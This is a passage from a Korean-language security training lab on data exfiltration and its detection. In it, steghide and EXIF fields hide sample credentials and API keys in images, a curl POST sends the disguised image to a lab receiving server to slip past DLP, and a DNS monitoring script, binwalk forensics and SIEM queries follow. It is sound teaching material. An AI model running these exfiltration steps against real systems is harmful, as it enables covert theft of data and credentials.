sshpass -p1 ssh secu@10.20.30.1

# tcpdump로 HTTPS 트래픽 캡처
sudo tcpdump -i any -n 'tcp port 8443' -c 50 -w /tmp/https_exfil.pcap 2>/dev/null &
sleep 5

# 캡처된 패킷 분석 - TLS 암호화로 내용 확인 불가
tcpdump -r /tmp/https_exfil.pcap -n 2>/dev/null | head -20
# 기대 출력:
# 10:30:01.123456 IP 10.20.30.80.54321 > 10.20.30.201.8443: Flags [S], ...
# 10:30:01.123789 IP 10.20.30.201.8443 > 10.20.30.80.54321: Flags [S.], ...
# ... (TLS handshake, 이후 암호화된 Application Data)

# 핵심 관찰: 페이로드 내용이 보이지 않음
tcpdump -r /tmp/https_exfil.pcap -X -n 2>/dev/null | grep -c "CONFIDENTIAL"
# 기대 출력: 0  (암호화되어 키워드 탐지 불가)

echo "[결론] TLS 암호화 트래픽에서는 DLP 키워드 매칭이 불가능"
```

## 3.2 스테가노그래피 이론

스테가노그래피(Steganography)는 비밀 데이터를 **일반 파일(커버 미디어) 안에 은닉**하는 기술이다. 암호화가 데이터의 존재를 숨기지 않고 읽을 수 없게 만드는 것이라면, 스테가노그래피는 **데이터의 존재 자체를 숨긴다**.

### 스테가노그래피 vs 암호화

| 속성 | 암호화(Encryption) | 스테가노그래피(Steganography) |
|------|-------------------|---------------------------|
| 목표 | 기밀성 (Confidentiality) | 은닉성 (Undetectability) |
| 데이터 존재 | 인지됨 (암호문 보임) | 인지 안 됨 (정상 파일로 보임) |
| 의심 유발 | 높음 (암호화 트래픽 자체가 의심) | 낮음 (정상 이미지/문서로 위장) |
| 파괴 저항 | 높음 (키 없이 해독 불가) | 낮음 (커버 미디어 변환 시 손실) |
| 결합 사용 | 가능 | 가능 (암호화 후 은닉이 최적) |

### LSB(Least Significant Bit) 삽입 기법

이미지 스테가노그래피에서 가장 널리 사용되는 방법이다.

```
원본 픽셀 (RGB 각 8비트):
  R: 10110100  G: 01101001  B: 11001010
                                    ↑
  LSB (최하위 비트)를 변경해도 색상 차이는 인간 눈으로 구분 불가

비밀 데이터 'A' = 01000001 을 삽입:
  R: 10110100 → 10110100 (0)   # LSB를 0으로 설정
  G: 01101001 → 01101001 (1)   # LSB를 1으로 설정
  B: 11001010 → 11001010 (0)   # LSB를 0으로 설정
  ... (나머지 비트는 다음 픽셀에)

→ 1픽셀(3바이트)에 3비트 저장, 1바이트 저장에 약 2.67 픽셀 필요
→ 1024x768 이미지 = 786,432 픽셀 = 약 294 KB 데이터 은닉 가능
```

### 주요 스테가노그래피 도구

| 도구 | 지원 형식 | 방식 | 암호화 | 탐지 난이도 |
|------|----------|------|--------|-----------|
| steghide | JPEG, BMP, WAV, AU | DCT 계수 수정 | AES-128 내장 | 중간 |
| exiftool | JPEG, PNG, TIFF | EXIF 메타데이터 삽입 | 없음 | 낮음 |
| zsteg | PNG, BMP | LSB 분석/삽입 | 없음 | 중간 |
| stegsolve | 이미지 전반 | 비트 평면 분석 | - | 분석 도구 |
| OpenStego | PNG | LSB 삽입 | DES/AES | 중간 |
| snow | 텍스트 | 공백문자 삽입 | ICE 암호화 | 높음 |

## 실습 3.2: steghide를 이용한 이미지 데이터 은닉

> **실습 목적**: steghide 도구를 사용하여 JPEG 이미지에 민감 데이터를 은닉하고, 이를 정상적인 이미지 파일처럼 전송하여 유출한다. 이후 은닉된 데이터를 추출하고, 포렌식 도구로 스테가노그래피 사용 흔적을 분석한다.
>
> **배우는 것**: steghide의 임베딩/추출 메커니즘, JPEG DCT 계수를 이용한 데이터 삽입 원리, binwalk/strings를 이용한 포렌식 분석 기법을 학습한다.
>
> **결과 해석**: 은닉 전후 이미지의 MD5 해시는 달라지지만, 파일 크기는 거의 변하지 않고 육안으로 차이를 구분할 수 없다. binwalk 분석에서 추가 데이터 존재 여부를 확인할 수 있으며, steghide info 명령으로 임베딩 여부를 검증할 수 있다.
>
> **실전 활용**: 포렌식 조사 시 의심스러운 이미지 파일에 대해 steghide, binwalk, zsteg 등 다중 도구 분석을 수행한다. 특히 이메일 첨부파일이나 클라우드 스토리지에 업로드된 이미지 파일이 유출 매체로 사용될 수 있다.

### 1단계: 커버 이미지 준비 (opsclaw)

```bash
# 테스트용 커버 이미지 생성 (ImageMagick 사용)
convert -size 800x600 xc:skyblue \
  -font Liberation-Sans -pointsize 30 \
  -draw "text 250,300 'Company Logo'" \
  -draw "rectangle 100,100 700,500" \
  /tmp/cover_original.jpg

# 원본 이미지 정보 확인
file /tmp/cover_original.jpg
ls -la /tmp/cover_original.jpg
md5sum /tmp/cover_original.jpg
# 기대 출력:
# /tmp/cover_original.jpg: JPEG image data, JFIF standard 1.01, ...
# -rw-r--r-- 1 opsclaw opsclaw 15234 ... /tmp/cover_original.jpg
# a1b2c3d4e5f6... /tmp/cover_original.jpg

# 커버 이미지 복사 (은닉 작업용)
cp /tmp/cover_original.jpg /tmp/cover.jpg

# steghide 용량 확인
steghide info /tmp/cover.jpg
# 기대 출력:
# "cover.jpg":
#   format: jpeg
#   capacity: 1.2 KB    ← 이 이미지에 숨길 수 있는 최대 데이터 크기
```

### 2단계: 데이터 은닉 (opsclaw)

```bash
# 비밀 데이터 준비
cat > /tmp/exfil_payload.txt << 'EOF'
=== 탈취한 인증 정보 ===
DB Host: 10.20.30.100
DB User: admin
DB Pass: Pr0duct!0n_DB_2026
API Key: sk-abcdef1234567890
SSH Private Key (일부): -----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3X7...
EOF

# steghide로 이미지에 데이터 삽입
steghide embed -cf /tmp/cover.jpg -ef /tmp/exfil_payload.txt -p "S3cr3t_P@ss" -f
# 기대 출력:
# embedding "/tmp/exfil_payload.txt" in "/tmp/cover.jpg"... done

# 은닉 후 이미지 비교
echo "=== 파일 크기 비교 ==="
ls -la /tmp/cover_original.jpg /tmp/cover.jpg
# 기대 출력: 크기가 거의 동일 (수 바이트 차이)

echo "=== MD5 해시 비교 ==="
md5sum /tmp/cover_original.jpg /tmp/cover.jpg
# 기대 출력: 해시값이 다름 (데이터가 삽입되었으므로)

echo "=== 파일 형식 확인 ==="
file /tmp/cover.jpg
# 기대 출력: JPEG image data (정상 JPEG으로 인식)

# steghide로 은닉 여부 확인 (비밀번호 필요)
steghide info /tmp/cover.jpg -p "S3cr3t_P@ss"
# 기대 출력:
# "cover.jpg":
#   format: jpeg
#   capacity: 1.2 KB
#   Try to get information about embedded data ? (y/n) y
#   embedded file "exfil_payload.txt":
#     size: 198.0 Byte
#     encrypted: rijndael-128, cbc
```

> **명령어 해설**:
> - `steghide embed -cf <커버> -ef <은닉데이터> -p <비밀번호>`: 커버 파일에 데이터를 삽입
> - `-f`: 기존 파일을 강제 덮어씀
> - `-p`: 추출 시 필요한 비밀번호. AES-128(Rijndael-128)으로 암호화 후 삽입
> - `steghide info`: 파일의 스테가노그래피 용량 및 은닉 데이터 정보 확인

### 3단계: 은닉 이미지를 통한 유출 (web 서버 경유)

```bash
# web 서버에서 은닉 이미지를 정상 업로드처럼 전송
sshpass -p1 ssh web@10.20.30.80

# 은닉 이미지를 web 서버로 전송 (SCP)
# (실제 시나리오에서는 공격자가 이미 확보한 이미지를 사용)
scp -o StrictHostKeyChecking=no opsclaw@10.20.30.201:/tmp/cover.jpg /tmp/upload_image.jpg 2>/dev/null

# 정상적인 이미지 업로드로 위장하여 유출
curl -k -X POST \
  -H "Content-Type: image/jpeg" \
  -H "X-Upload-Name: team_photo_2026.jpg" \
  --data-binary @/tmp/upload_image.jpg \
  https://10.20.30.201:8443/api/media/upload

echo "[유출] 이미지로 위장한 데이터 유출 완료"
# DLP는 이 트래픽을 '이미지 업로드'로 판단하여 통과시킴
```

### 4단계: 데이터 추출 (opsclaw 수신 서버)

```bash
# 수신된 파일에서 은닉 데이터 추출
steghide extract -sf /tmp/exfil_received/latest.jpg -p "S3cr3t_P@ss" -xf /tmp/recovered_payload.txt -f
# 기대 출력:
# wrote extracted data to "/tmp/recovered_payload.txt".

cat /tmp/recovered_payload.txt
# 기대 출력:
# === 탈취한 인증 정보 ===
# DB Host: 10.20.30.100
# DB User: admin
# DB Pass: Pr0duct!0n_DB_2026
# ...
```

> **트러블슈팅**:
> - `steghide: the cover file is too short to embed the data`: 더 큰 이미지를 사용하거나 압축률이 높은 JPEG 사용
> - `steghide: could not extract any data with that passphrase`: 비밀번호 확인. 대소문자 구분됨
> - JPEG가 아닌 PNG 파일: steghide는 JPEG/BMP/WAV/AU만 지원. PNG는 `zsteg` 사용
> - ImageMagick `convert` 없는 경우: `sudo apt install imagemagick` 또는 인터넷에서 JPEG 다운로드

## 실습 3.3: EXIF 메타데이터를 이용한 데이터 은닉

> **실습 목적**: exiftool을 이용하여 이미지 파일의 EXIF 메타데이터 필드에 데이터를 삽입한다. 메타데이터 기반 유출의 단순성과 탐지 방법을 이해한다.
>
> **배우는 것**: EXIF 메타데이터 구조, exiftool을 이용한 메타데이터 읽기/쓰기, 메타데이터 기반 유출의 장단점을 학습한다.
>
> **결과 해석**: EXIF 메타데이터에 삽입된 데이터는 이미지 뷰어에서 보이지 않지만, exiftool이나 EXIF 분석기로 쉽게 확인할 수 있다. 따라서 포렌식 분석에 취약하지만, 일반적인 네트워크 DLP는 메타데이터 내용을 검사하지 않는 경우가 많다.
>
> **실전 활용**: 이메일 첨부 이미지나 웹 업로드 이미지의 EXIF 메타데이터를 자동으로 스트리핑하는 정책을 적용하여 메타데이터 기반 유출을 방지한다. 많은 SNS/메신저가 이미 이 기능을 제공한다.

```bash
# 원본 EXIF 정보 확인
exiftool /tmp/cover_original.jpg | head -20
# 기대 출력:
# ExifTool Version Number         : 12.xx
# File Name                       : cover_original.jpg
# ...

# EXIF Comment 필드에 민감 데이터 삽입
exiftool -Comment="$(cat /tmp/exfil_payload.txt | base64 -w 0)" /tmp/cover_original.jpg
# 기대 출력:
#     1 image files updated

# UserComment 필드에도 추가 데이터 삽입
exiftool -UserComment="API_KEY=sk-abcdef1234567890" /tmp/cover_original.jpg

# 삽입된 데이터 확인
exiftool -Comment -UserComment /tmp/cover_original.jpg
# 기대 출력:
# Comment      : PVN9PSBtNGx0MOuCiCDsnbjso...  (Base64 인코딩된 데이터)
# User Comment : API_KEY=sk-abcdef1234567890

# Base64 디코딩으로 원본 데이터 복원
exiftool -Comment -b /tmp/cover_original.jpg | base64 -d
# 기대 출력:
# === 탈취한 인증 정보 ===
# DB Host: 10.20.30.100
# ...

# EXIF 메타데이터 완전 제거 (방어 측 대응)
exiftool -all= /tmp/cover_original.jpg
exiftool /tmp/cover_original.jpg
# 기대 출력: 모든 메타데이터가 제거됨
```

> **명령어 해설**:
> - `exiftool -Comment="..."`: JPEG Comment 필드에 데이터 삽입
> - `exiftool -b`: 바이너리(원시) 값 출력 (Base64 문자열 그대로)
> - `exiftool -all=`: 모든 메타데이터를 제거 (방어 목적)
>
> **트러블슈팅**:
> - exiftool 미설치: `sudo apt install libimage-exiftool-perl`
> - EXIF 필드 크기 제한: Comment 필드는 약 64KB까지 저장 가능
> - 일부 이미지 형식은 EXIF 미지원: PNG는 tEXt 청크 사용 (`exiftool -Comment="..." image.png`)

## 실습 3.4: binwalk를 이용한 스테가노그래피 포렌식 분석

> **실습 목적**: 포렌식 도구(binwalk, strings, file)를 사용하여 의심스러운 이미지 파일에서 숨겨진 데이터를 탐지하고 추출한다.
>
> **배우는 것**: binwalk의 시그니처 기반 분석, strings 명령을 이용한 문자열 추출, 파일 엔트로피 분석을 통한 은닉 데이터 탐지 기법을 학습한다.
>
> **결과 해석**: binwalk 분석에서 이미지 파일 내부에 예상치 못한 파일 시그니처(ZIP, gzip, 텍스트 등)가 발견되면 스테가노그래피 사용을 의심할 수 있다. 엔트로피 분석에서 특정 영역의 엔트로피가 비정상적으로 높으면 암호화된 은닉 데이터가 존재할 가능성이 높다.
>
> **실전 활용**: 침해사고 대응(IR) 시 유출 의심 파일에 대한 표준 분석 절차로 활용한다. 자동화된 포렌식 파이프라인에서 binwalk + 엔트로피 분석을 필수 단계로 포함시킨다.

```bash
# binwalk 기본 분석 - 파일 내 시그니처 검색
binwalk /tmp/cover.jpg
# 기대 출력:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# ---------------------------------------------------------------
# 0             0x0             JPEG image data, JFIF standard 1.01
# (steghide는 DCT 계수를 변경하므로 별도 시그니처가 나타나지 않을 수 있음)

# binwalk 엔트로피 분석
binwalk -E /tmp/cover.jpg
# 기대 출력: 엔트로피 그래프 (ASCII art)
# 높은 엔트로피 영역이 은닉 데이터 존재를 시사

# strings 명령으로 이미지 내 문자열 검색
strings /tmp/cover.jpg | grep -iE "(password|key|secret|admin)" || echo "문자열 탐지 없음"
# steghide는 AES 암호화를 적용하므로 평문 문자열은 나타나지 않음

# EXIF 기반 은닉의 경우 strings로 탐지 가능
strings /tmp/cover_original.jpg | grep -iE "(password|key|secret|admin)"
# 기대 출력: (EXIF에 평문으로 삽입한 경우 탐지됨)
# API_KEY=sk-abcdef1234567890

# 파일 내부 구조 상세 분석
hexdump -C /tmp/cover.jpg | head -30
# JPEG 파일의 SOI(Start of Image) 마커 FF D8 확인

# 원본과 은닉본의 바이너리 차이 비교
cmp -l /tmp/cover_original.jpg /tmp/cover.jpg | head -20
# 기대 출력: 바이트 단위 차이 위치와 값 표시
# (steghide가 수정한 DCT 계수 위치들)
```

> **트러블슈팅**:
> - binwalk 미설치: `sudo apt install binwalk`
> - 엔트로피 분석 그래프 미출력: `binwalk -E --save` 로 PNG 파일 생성
> - cmp 명령 출력이 너무 많은 경우: `| wc -l`로 차이 바이트 수만 확인

---

# Part 4: 유출 탐지 및 방지 (20분)

## 4.1 DLP 정책 수립 가이드

효과적인 데이터 유출 방지를 위해서는 다층 방어(Defense in Depth) 전략이 필요하다.

### 데이터 분류 체계

| 등급 | 예시 | 유출 시 영향 | 보호 수준 |
|------|------|-----------|----------|
| 1등급 (공개) | 마케팅 자료, 공개 보고서 | 없음 | 기본 |
| 2등급 (내부) | 사내 문서, 회의록 | 낮음 | 접근 통제 |
| 3등급 (기밀) | 고객 DB, 재무 데이터 | 높음 | 암호화 + DLP |
| 4등급 (극비) | 영업비밀, 소스코드 | 치명적 | 격리 + 감사 + DLP |

### 계층별 DLP 방어

```
[네트워크 계층]
  +-- 인라인 DLP 프록시 (SSL Inspection 포함)
  +-- DNS 트래픽 분석 (길이/빈도/엔트로피 모니터링)
  +-- NetFlow 기반 이상 탐지 (비정상 아웃바운드 트래픽)
  +-- CASB (Cloud Access Security Broker)

[엔드포인트 계층]
  +-- 에이전트 기반 DLP (파일 복사/인쇄/USB 통제)
  +-- 스크린 워터마크 (화면 캡처 추적)
  +-- 클립보드 모니터링
  +-- 프로세스 허용 목록

[이메일/협업 도구 계층]
  +-- 첨부파일 DLP 스캔
  +-- EXIF 메타데이터 자동 제거
  +-- 외부 도메인 전송 승인 절차
  +-- 키워드/패턴 매칭

[데이터 계층]
  +-- 데이터 분류 라벨링
  +-- 접근 제어 (RBAC + ABAC)
  +-- 감사 로그 (누가 어떤 데이터에 접근했는가)
  +-- 디지털 워터마크 / 핑거프린팅
```

## 4.2 DNS 트래픽 분석 기반 탐지

### DNS 유출 탐지 지표

| 지표 | 정상 범위 | 이상 (유출 의심) | 탐지 방법 |
|------|----------|----------------|----------|
| 서브도메인 길이 | 5~25자 | 40자 이상 | 통계 분석 |
| 쿼리 엔트로피 | 2.0~3.5 | 4.0 이상 | Shannon 엔트로피 |
| 단일 도메인 쿼리/분 | 1~10회 | 30회 이상 | 빈도 카운팅 |
| TXT 레코드 질의 비율 | 1~5% | 30% 이상 | 레코드 유형 통계 |
| 새 도메인(NXDomain) 비율 | 1~3% | 20% 이상 | 응답 코드 분석 |
| 쿼리 시간 패턴 | 업무시간 집중 | 새벽/주기적 | 시계열 분석 |

### 실시간 DNS 모니터링 스크립트

```bash
# DNS 쿼리 실시간 모니터링 및 이상 탐지
cat > /tmp/dns_monitor.sh << 'BASH'
#!/bin/bash
# DNS Exfiltration 실시간 모니터 v1.0
# 사용법: sudo bash /tmp/dns_monitor.sh [인터페이스]

IFACE=${1:-any}
THRESHOLD_LEN=40      # 서브도메인 길이 임계값
THRESHOLD_FREQ=30     # 분당 쿼리 빈도 임계값
LOGFILE="/tmp/dns_exfil_alerts.log"

echo "=== DNS Exfiltration Monitor 시작 ==="
echo "인터페이스: $IFACE, 임계값: 길이>${THRESHOLD_LEN}, 빈도>${THRESHOLD_FREQ}/분"
echo "경보 로그: $LOGFILE"
echo "======================================="

declare -A QUERY_COUNT
CURRENT_MINUTE=$(date +%M)

sudo tcpdump -i "$IFACE" -n 'udp port 53' -l 2>/dev/null | while read line; do
  # DNS 쿼리에서 도메인 추출
  DOMAIN=$(echo "$line" | grep -oP '(?<=\s)[A-Za-z0-9._-]+\.[a-z]{2,}(?=[\s?])')
  [ -z "$DOMAIN" ] && continue
  
  # 서브도메인 길이 검사
  SUBDOMAIN=$(echo "$DOMAIN" | cut -d. -f1)
  LEN=${#SUBDOMAIN}
  
  if [ "$LEN" -gt "$THRESHOLD_LEN" ]; then
    ALERT="[경보] 긴 서브도메인 탐지: ${SUBDOMAIN:0:50}... (${LEN}자) → ${DOMAIN}"
    echo "$ALERT"
    echo "$(date '+%Y-%m-%d %H:%M:%S') $ALERT" >> "$LOGFILE"
  fi
  
  # 빈도 카운팅 (분 단위)
  NOW_MIN=$(date +%M)
  if [ "$NOW_MIN" != "$CURRENT_MINUTE" ]; then
    for key in "${!QUERY_COUNT[@]}"; do
      if [ "${QUERY_COUNT[$key]}" -gt "$THRESHOLD_FREQ" ]; then
        ALERT="[경보] 고빈도 도메인: $key (${QUERY_COUNT[$key]}회/분)"
        echo "$ALERT"
        echo "$(date '+%Y-%m-%d %H:%M:%S') $ALERT" >> "$LOGFILE"
      fi
    done
    unset QUERY_COUNT
    declare -A QUERY_COUNT
    CURRENT_MINUTE=$NOW_MIN
  fi
  
  BASE_DOMAIN=$(echo "$DOMAIN" | rev | cut -d. -f1-2 | rev)
  QUERY_COUNT[$BASE_DOMAIN]=$(( ${QUERY_COUNT[$BASE_DOMAIN]:-0} + 1 ))
done
BASH

chmod +x /tmp/dns_monitor.sh
echo "[완료] DNS 모니터 스크립트 생성됨. 실행: sudo bash /tmp/dns_monitor.sh"
```

## 4.3 NetFlow 기반 이상 탐지

NetFlow 데이터는 패킷 내용 없이도 트래픽 패턴 이상을 탐지할 수 있다.

```bash
# 대용량 아웃바운드 세션 탐지 (10MB 이상)
nfdump -r /var/cache/nfdump/nfcapd.current -o "fmt:%ts %sa %da %dp %byt" \
  "dst net not 10.0.0.0/8 and bytes > 10000000" 2>/dev/null | sort -t' ' -k5 -rn | head -10

# DNS 포트(53) 트래픽 볼륨 이상 탐지
nfdump -r /var/cache/nfdump/nfcapd.current -s dstport/bytes "dst port 53" 2>/dev/null | head -5
```

## 4.4 OpsClaw를 활용한 자동 유출 탐지 파이프라인

OpsClaw 플랫폼을 이용하면 유출 탐지를 자동화할 수 있다. Manager API를 통해 다중 서버에서 동시에 탐지 작업을 수행하고, 결과를 중앙에서 수집한다.

```bash
# OpsClaw 프로젝트 생성: DNS 유출 탐지 작업
export OPSCLAW_API_KEY=opsclaw-api-key-2026

curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "dns-exfil-detect",
    "request_text": "DNS 유출 의심 트래픽 자동 탐지",
    "master_mode": "external"
  }' | python3 -m json.tool
# 프로젝트 ID 기록

# Stage 전환
PROJECT_ID="<생성된 프로젝트 ID>"
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY"
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY"

# 다중 서버 탐지 작업 실행
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "tcpdump -i any -n \"udp port 53\" -c 1000 -w /tmp/dns_sample.pcap 2>/dev/null && tcpdump -r /tmp/dns_sample.pcap -n 2>/dev/null | awk \"{print \\$NF}\" | sort | uniq -c | sort -rn | head -20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "cat /var/log/suricata/fast.log 2>/dev/null | grep -i \"dns exfil\" | tail -50 || echo \"No DNS exfil alerts found\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "ss -tunap | grep \":53 \" | awk \"{print \\$5}\" | cut -d: -f1 | sort | uniq -c | sort -rn | head -10",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool

# 결과 확인
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/${PROJECT_ID}/evidence/summary" | python3 -m json.tool

# 완료 보고서 생성
curl -s -X POST "http://localhost:8000/projects/${PROJECT_ID}/completion-report" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "DNS 유출 탐지 스캔 완료",
    "outcome": "success",
    "work_details": [
      "secu 서버 DNS 트래픽 샘플링 및 빈도 분석",
      "Suricata DNS 유출 경보 로그 점검",
      "web 서버 DNS 연결 상태 점검"
    ]
  }' | python3 -m json.tool
```

## 4.5 Suricata + Wazuh 통합 유출 탐지

```bash
# Suricata 규칙을 Wazuh와 연동하여 중앙 경보 수집
# siem 서버의 Wazuh 관리자에서 Suricata 로그 수집 설정 확인
sshpass -p1 ssh siem@10.20.30.100

# Wazuh에서 Suricata 경보 조회
cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        alert = json.loads(line)
        rule = alert.get('rule', {})
        if 'exfil' in rule.get('description', '').lower() or \
           'dns' in rule.get('description', '').lower():
            print(f\"[{alert.get('timestamp','')}] {rule.get('description','')} (Level: {rule.get('level','')})\" )
    except:
        pass
" | tail -20
# 기대 출력: DNS 유출 관련 Wazuh 경보 목록
```

## 4.6 종합 유출 방어 체크포인트

조직 내 데이터 유출 방어 성숙도를 평가하기 위한 핵심 질문:

| 영역 | 점검 항목 | 측정 방법 |
|------|----------|----------|
| 데이터 분류 | 모든 민감 데이터에 등급이 부여되어 있는가? | 분류 정책 문서, 라벨링 적용률 |
| 네트워크 DLP | SSL Inspection이 적용되어 있는가? | 프록시 설정, 복호화 대상 범위 |
| DNS 모니터 | DNS 쿼리 이상 탐지가 운영 중인가? | 탐지 규칙 수, 오탐률, 평균 탐지 시간 |
| 엔드포인트 | USB/외부 저장장치 통제가 적용되어 있는가? | DLP 에이전트 배포율, 정책 적용률 |
| 클라우드 | CASB가 배치되어 있는가? | 모니터링 대상 SaaS 수, 정책 규칙 수 |
| 감사 | 데이터 접근 로그가 수집/분석되고 있는가? | 로그 보존 기간, SIEM 연동 여부 |
| 대응 | 유출 사고 대응 절차가 수립되어 있는가? | IR 계획서, 훈련 이력, 평균 대응 시간 |

---

## 검증 체크리스트

- [ ] DNS 쿼리의 서브도메인에 Base64 데이터를 인코딩하여 유출을 직접 수행할 수 있다
- [ ] dnscat2 서버/클라이언트를 구성하여 DNS 터널 기반 파일 전송을 수행할 수 있다
- [ ] DNS 유출 탐지를 위한 Suricata 규칙을 작성하고 검증할 수 있다
- [ ] DNS 쿼리의 엔트로피와 길이를 분석하여 유출 트래픽을 식별할 수 있다
- [ ] 자체 서명 인증서로 HTTPS 수신 서버를 구축하고 암호화된 데이터 유출을 수행할 수 있다
- [ ] TLS 암호화가 DLP 탐지를 우회하는 원리를 설명할 수 있다
- [ ] steghide를 사용하여 JPEG 이미지에 데이터를 은닉하고 추출할 수 있다
- [ ] exiftool을 사용하여 EXIF 메타데이터에 데이터를 삽입할 수 있다
- [ ] binwalk, strings 등 포렌식 도구로 스테가노그래피 사용 흔적을 분석할 수 있다
- [ ] DNS 트래픽 모니터링 스크립트를 작성하여 실시간 유출 탐지를 수행할 수 있다
- [ ] OpsClaw를 활용하여 다중 서버 유출 탐지 작업을 자동화할 수 있다
- [ ] 계층별 DLP 방어 전략(네트워크/엔드포인트/이메일/데이터)을 설명할 수 있다

---

## 자가 점검 퀴즈

**1. DNS Exfiltration에서 서브도메인 레이블의 최대 길이가 63바이트로 제한되는 이유는 무엇이며, 이 제한을 고려한 효율적인 데이터 인코딩 방법은?**

DNS RFC 1035 표준에서 레이블 길이를 1바이트(0~255)로 표현하되 상위 2비트를 압축 포인터로 예약하여 실질적으로 63(0x3F)바이트로 제한한다. 효율적인 인코딩을 위해 Base32(대소문자 구분 없어 DNS에 안전)를 사용하거나, 여러 레이블을 연결하여 데이터를 분산 삽입한다. 예: `chunk1.chunk2.chunk3.exfil.domain.com` 형태로 최대 약 180바이트까지 한 쿼리에 포함 가능하다.

**2. MITRE ATT&CK TA0010의 하위 기법 중 T1048(Exfiltration Over Alternative Protocol)과 T1041(Exfiltration Over C2 Channel)의 핵심 차이점은?**

T1041은 이미 수립된 C2(Command and Control) 통신 채널을 재사용하여 데이터를 유출하는 반면, T1048은 C2와 별도의 프로토콜(DNS, ICMP, FTP 등)을 사용하여 유출한다. T1048은 C2 채널이 차단되어도 유출이 가능하고, C2 트래픽 모니터링을 우회할 수 있으나 새로운 통신 채널 수립이 탐지될 위험이 있다.

**3. TLS 암호화된 HTTPS 유출을 탐지하기 위한 방법 3가지를 구체적으로 설명하시오.**

(1) SSL Inspection(MITM 프록시): 기업 CA 인증서를 클라이언트에 배포하고 프록시에서 TLS를 복호화하여 콘텐츠를 검사한다. (2) JA3/JA3S 핑거프린팅: TLS 핸드셰이크의 Client Hello/Server Hello 매개변수로 클라이언트/서버 특성을 식별하여 비정상 TLS 클라이언트를 탐지한다. (3) NetFlow/메타데이터 분석: 암호화 콘텐츠 없이도 대상 IP, 전송량, 세션 지속시간, 시간대 등 메타데이터로 이상 패턴을 탐지한다.

**4. steghide가 사용하는 DCT(Discrete Cosine Transform) 계수 수정 방식과 LSB 삽입 방식의 차이점은?**

LSB 삽입은 픽셀의 최하위 비트를 직접 변경하여 데이터를 삽입하는 공간 도메인 기법이다. steghide는 JPEG의 DCT 계수(주파수 도메인)를 미세 조정하여 데이터를 삽입한다. DCT 기반은 JPEG 재압축에 더 강하고, 통계적 분석(chi-square test 등)에 대한 내성이 LSB보다 높다. 반면 LSB는 BMP/PNG에서 더 단순하고 용량 효율이 높다.

**5. DNS 유출 트래픽의 Shannon 엔트로피가 정상 DNS 트래픽보다 높은 이유를 정보 이론적 관점에서 설명하시오.**

정상 DNS 쿼리의 서브도메인은 자연어 기반(www, mail, api 등)으로 문자 출현 빈도에 편향이 있어 엔트로피가 낮다(2.0~3.5). 반면 Base64/Hex 인코딩된 유출 데이터는 64/16개 문자가 균등하게 분포하여 최대 엔트로피(Base64: ~6.0, Hex: ~4.0)에 가까워진다. 암호화된 데이터는 의사 난수에 가까워 엔트로피가 더욱 높다.

**6. 클라우드 서비스(Google Drive, OneDrive 등)를 통한 데이터 유출이 기존 DLP로 탐지하기 어려운 이유 3가지는?**

(1) 정상 업무 트래픽과 동일한 도메인/프로토콜을 사용하여 도메인 차단이나 프로토콜 필터링이 불가능하다. (2) TLS 1.3 및 인증서 피닝으로 SSL Inspection이 어렵다. (3) OAuth 인증을 통해 API를 직접 호출하므로 웹 프록시 로그에 상세 활동이 남지 않으며, CASB 없이는 파일 업로드/다운로드 구분이 불가능하다.

**7. T1029(Scheduled Transfer)를 사용하는 공격자의 전술적 의도와 이를 탐지하기 위한 시계열 분석 기법을 설명하시오.**

공격자는 데이터를 한꺼번에 유출하면 트래픽 급증으로 탐지될 수 있으므로, 업무시간에 소량씩 주기적으로 유출한다. 탐지를 위해 시계열 베이스라인을 수립하고 특정 시간대(야간/주말)의 반복적 아웃바운드 트래픽, 정확한 주기의 전송 패턴(cron-like), 누적 전송량의 이상 증가를 분석한다. Fourier 변환으로 주기적 패턴을 추출할 수 있다.

**8. EXIF 메타데이터를 이용한 유출과 steghide를 이용한 유출의 포렌식 탐지 난이도 차이를 비교하시오.**

EXIF 메타데이터 기반 유출은 `exiftool`, `strings` 등 기본 도구로 쉽게 탐지 가능하다. Comment, UserComment 등 필드에 Base64 문자열이 보이면 즉시 의심할 수 있다. 반면 steghide는 DCT 계수를 변경하므로 바이너리 분석으로도 은닉 여부를 판단하기 어렵다. 비밀번호 없이는 `steghide info`로도 확인이 불가하며, 통계적 분석(RS 분석, chi-square 검정) 등 전문 스테고 분석 도구가 필요하다.

**9. 네트워크 DLP, 엔드포인트 DLP, 클라우드 DLP(CASB) 각각의 강점과 한계를 유출 채널별로 비교하시오.**

네트워크 DLP: 인라인 배치로 실시간 차단 가능하나 TLS 암호화 트래픽과 비표준 포트 사용 시 한계. 엔드포인트 DLP: USB, 프린트, 클립보드 등 로컬 유출 채널 통제 가능하나 에이전트 비활성화/우회 가능성 존재. CASB: 클라우드 서비스 API 수준의 가시성 제공하나 섀도우 IT(미등록 SaaS)에는 무력하고 실시간 차단보다는 사후 탐지 중심이다.

**10. 조직에서 데이터 유출 방지를 위한 종합 전략을 수립할 때, 기술적 대책 외에 필요한 관리적/물리적 대책을 5가지 이상 제시하시오.**

